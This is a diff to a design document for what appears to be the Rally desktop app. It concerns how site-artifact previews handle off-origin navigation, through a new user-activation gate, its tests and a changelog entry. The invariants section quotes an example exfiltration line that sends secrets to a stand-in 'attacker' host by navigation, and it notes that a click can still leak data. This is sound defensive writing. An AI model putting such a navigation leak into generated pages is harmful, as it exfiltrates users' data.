@@ -40,7 +40,7 @@ exists.
 | `apps/api/src/services/artifact-open-service.ts` | The identity-bearing door into an artifact origin: the open-time visibility check and the fragment-carrying URL it mints. Public reads bypass it and remain anonymous. |
 | `apps/desktop/src/renderer/components/site-resource-detail.tsx` | The site detail: the pane it measures and hands over, the actions it puts in its host's header, and the Data view. |
 | `apps/desktop/src/renderer/components/detail-header-actions.tsx` | The slot a rail or lightbox offers in its header, and the portal any detail fills it through. Not artifact-specific: it is what keeps this detail's controls out of the page it is showing. |
-| `apps/desktop/src/main/artifact-viewers.ts` | What the desktop will load into an artifact surface, the preview rectangle's clamp and corner, the shared isolation contract, and the overlay rule. |
+| `apps/desktop/src/main/artifact-viewers.ts` | What the desktop will load into an artifact surface, the preview rectangle's clamp and corner, the shared isolation contract, the activation gate on leaving the origin, and the overlay rule. |
 
 ## How it works
 
@@ -287,19 +287,26 @@ is the only place that can forward into it.
   root-scoped service worker is the single thing an artifact can install that
   answers requests without reaching Rally at all — defeating revocation, the
   current-version guarantee, and the offline message in one move.
-- **Nothing an artifact composes is handed to the system browser.** An
-  off-origin navigation is refused, not opened externally: `location = "https://
-  attacker/?" + secrets` is a navigation, which `connect-src` and `form-action`
-  do not touch, and opening it would make Rally perform the exfiltration the
-  egress fence exists to prevent. **In a plain browser tab that channel stays
-  open**, and no header closes it — CSP has no directive over where a document
-  navigates itself. So the egress fence is honestly two claims, not one: no
-  artifact can *fetch, load, beacon, or post* off-origin anywhere, and in
-  Rally's own surfaces it cannot navigate off-origin either. A page opened in
-  a browser can still put what it can see into a URL bar the person watches it
-  land in — which is the reason the desktop refuses rather than hands off, and
-  the reason this is written down rather than left as an assumed property of
-  the CSP.
+- **An artifact leaves its origin only through a person's own press, and never
+  in place.** `location = "https://attacker/?" + secrets` is a navigation, which
+  `connect-src` and `form-action` do not touch, so an unattended off-origin
+  navigation is dropped: no timer, no `onload`, no cursor passing over the page
+  reaches the system browser. Under transient user activation — a press or a tap
+  on that surface within the five seconds Chromium itself calls activation — an
+  `http(s)` link is handed to the default browser instead, and the preview never
+  follows it in place, because a pane that says it is showing the artifact must
+  not be showing something else. A redirect is not a press and is refused
+  whatever the activation says; the destination of a `302` is not the URL
+  somebody chose to follow.
+  **What this closes and what it does not** is the whole of the claim, and is
+  written down rather than left as an assumed property of the CSP. No artifact
+  can *fetch, load, beacon, or post* off-origin anywhere — that fence is whole.
+  Navigation is narrower: unattended exfiltration by navigation is closed in
+  Rally's surfaces, but a person clicking `Read the docs →` cannot see where the
+  link points, so a page that wants to leak through a click still can, in
+  exactly the way it can in a plain browser tab, where no header closes the
+  channel at all. The gate buys that every handoff is somebody's own press. It
+  does not buy that the URL is one they would have chosen.
 - **The asset manifest is the only index.** Nothing resolves a path the manifest
   does not name, which is what makes the server module's absence from `assets` a
   real 404 rather than a convention.
@@ -413,8 +420,8 @@ facet that holds a stateful artifact's data. It does not own:
 | `pnpm --filter @rally/api exec vitest run test/terminal-runtime.test.ts` | Directory publish end to end through the runtime, against a simulated sandbox shell. |
 | `pnpm --filter @rally/api exec vitest run test/artifact-open-service.test.ts` | Which authority answers which question at open time, that a refusal mints nothing, and that a missing artifact and an invisible one are indistinguishable. |
 | `pnpm --filter @rally/desktop exec vitest run src/renderer/components/site-resource-detail.test.tsx` | The detail: that it measures and hands over rather than embedding, that its actions land in the host's header and each carries a tooltip, that Copy link carries no code, that the data toggle only exists for a site that keeps data and takes the composited view down with it, and that the pane never flashes its unavailable state. |
-| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-viewers.test.ts` | What the desktop will load, the rectangle clamp, the isolation contract, the overlay collapse, and the teardown guards — each surface's lifecycle branch separately, since one guard covering both reads as covered while half of it is dead. |
-| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-preview-wiring.test.ts` | The per-window registry in `index.ts`, which the controller's own suite cannot see: one controller and so one `closed` listener per window, the entry removed only by that listener, and the adapter reporting lifecycle rather than assuming it. |
+| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-viewers.test.ts` | What the desktop will load, the rectangle clamp, the isolation contract, the activation gate (unattended navigation dropped, an activated link handed over and never followed in place, redirects and disallowed schemes refused either way, and what does and does not count as a press), the overlay collapse, and the teardown guards — each surface's lifecycle branch separately, since one guard covering both reads as covered while half of it is dead. |
+| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-preview-wiring.test.ts` | The per-window registry in `index.ts`, which the controller's own suite cannot see: one controller and so one `closed` listener per window, the entry removed only by that listener, the adapter reporting lifecycle rather than assuming it, and each artifact surface being confined with an activation tracker built from its own input stream. |
 | `pnpm --filter @rally/api exec vitest run test/workstream-artifact-data-tools.test.ts` | The data tools' contract and the site read-remediation, including its round trip through the real structured-failure sanitizer. |
 | `pnpm --filter @rally/agent-harness exec vitest run` | The skill's shape and the standing policy's byte budget — the prompt bound is what keeps the policy six lines rather than nine. |
 | `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-stateless-module.test.ts` | A **stateless active** site's isolate on real workerd: that the `ASSETS` stub crosses the loader's env at all, that it serves this artifact's files, that the relative-string read works, and that `fetch()` throws. Scope is the isolate contract, not admission — the fences in front of it are the policy suite's. |
@@ -481,6 +488,50 @@ compromise of the serving Worker exposes artifact content and viewer sessions
 rather than workspace authority.
 
 ## Changelog
+
+### 2026-09-11 — A link in a site preview leaves through the person who clicked it
+
+**What changed:** `confineToArtifactOrigin` now takes a link-handoff capability
+and decides with it. An off-origin navigation is still never followed in place,
+but under transient user activation it is handed to the default browser instead
+of dropped — for both artifact surfaces, and for a `target="_blank"` link, which
+leaves through the same gate without a second window being made. Activation is
+reconstructed per surface in the main process from Electron's `input-event`
+stream, because nothing tells the main process about activation when a
+navigation starts. Redirects and schemes outside the process's `http(s)` policy
+are refused whatever the activation says.
+
+**Why:** The previous rule refused every off-origin navigation and handed it
+nowhere, so a dashboard full of links was a page whose links did nothing at all
+and the only recourse was to copy a URL out of a view that cannot be selected
+from. That cost was accepted on the reasoning that the URL is model-composed and
+handing it over makes Rally perform the exfiltration the egress fence exists to
+prevent. That reasoning is still right about the *unattended* case and is what
+the gate keeps: nothing reaches the browser without a press, so no timer, no
+`onload`, and no cursor passing over the page gets there. It was never a
+complete defence of the attended case — a person cannot read where a link points
+before following it — and paying for a partial defence with every working link
+was the wrong trade once sites became something people are meant to use.
+
+**Considered and rejected:** Opening every off-origin navigation, which is the
+simple reading of the request and removes the fence entirely: a page could then
+send itself away with nobody present, which is the one case the gate is cheap to
+keep closed. A confirmation dialog showing the destination, which does close the
+attended case — the only thing that does — but puts a modal in front of every
+link on a dashboard; it remains the upgrade if a leak through a click ever
+stops being theoretical. Honouring activation on `will-redirect`, which hands
+the gate back to the page, since a model-authored handler answers requests on
+this origin and can redirect a same-origin click anywhere.
+
+**Consequences:** The five-second lifespan is transcribed from Chromium's
+`blink::UserActivationState::kActivationLifespan` rather than chosen here, so
+Rally and the page agree about when somebody is acting; a different span would
+make them disagree and is not a free number to change. The gate is only as good
+as the input stream feeding it — a new artifact surface that forgets
+`artifactLinkHandoff` gets an activation that never fires, so every link on it
+silently stops working, which the wiring test is there to catch. Anything that
+widens this further has to say, as the invariant now does, what it closes and
+what it does not.
 
 ### 2026-09-11 — The page's corner is the pane's, and the pane's host decides it
 
